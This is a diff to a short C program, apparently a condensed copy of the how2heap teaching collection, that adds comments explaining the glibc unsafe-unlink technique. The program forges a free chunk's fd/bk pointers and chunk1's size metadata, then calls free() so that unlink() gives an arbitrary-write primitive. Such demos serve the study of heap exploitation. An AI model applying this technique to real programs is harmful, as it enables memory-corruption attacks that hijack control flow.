@@ -1,6 +1,5 @@
 /*
- * https://github.com/shellphish/how2heap
- *
+ * condensed version of https://github.com/shellphish/how2heap
  */
 
 #include <stdio.h>
@@ -28,20 +27,24 @@ int main()
     fprintf(stderr, "sizeof(uint64_t): %ld\n", sizeof(uint64_t));
 
     chunk0_ptr[0] = 0;
-    chunk0_ptr[1] = sizeof(size_t);
+    chunk0_ptr[1] = sizeof(size_t); // size
     chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*3); // fd
     chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*2); // bk
 
     uint64_t *chunk1_hdr = chunk1_ptr;
 
+    // decrease ptr to manipulate chunk1's metadata 
     chunk1_hdr--;
     chunk1_hdr--;
 
-    chunk1_hdr[0] = malloc_size;
+    // forge chunk0 as a freed chunk to induce coalescing (which will do unlink() eventually)
+    chunk1_hdr[0] = malloc_size; // decrease chunk size and our forged metadata will be used
     chunk1_hdr[1] &= ~1;
 
     free(chunk1_ptr);
     
+    // now chunk0_ptr points somewhere close to itself.
+    // so, we can use it to write itself.
     fprintf(stderr, "chunk0_ptr: %p\n", chunk0_ptr);
 
     *(chunk0_ptr+3) = 0x601020LL;
